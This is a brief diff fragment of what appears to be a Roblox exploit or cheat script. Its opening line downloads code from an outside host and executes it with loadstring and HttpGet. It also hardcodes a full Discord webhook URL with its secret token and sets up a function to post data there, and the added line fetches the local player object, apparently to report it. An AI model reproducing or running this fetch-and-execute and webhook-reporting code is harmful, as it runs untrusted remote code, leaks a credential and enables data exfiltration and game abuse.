@@ -1,6 +1,7 @@
 loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoArrestV3'))()
 
 local webhookUrl = "https://discord.com/api/webhooks/1336346308956524564/QgLSBGajjPB2OEONqdxMKVLcOzZAQoqjAWe0zivi-5TLXbt4Zw5PBN27--6JThdviZ2U" 
+local player = game:GetService("Players").LocalPlayer
 local http_request = http_request or request or HttpPost or syn.request
 
 local function sendToWebhook(message)
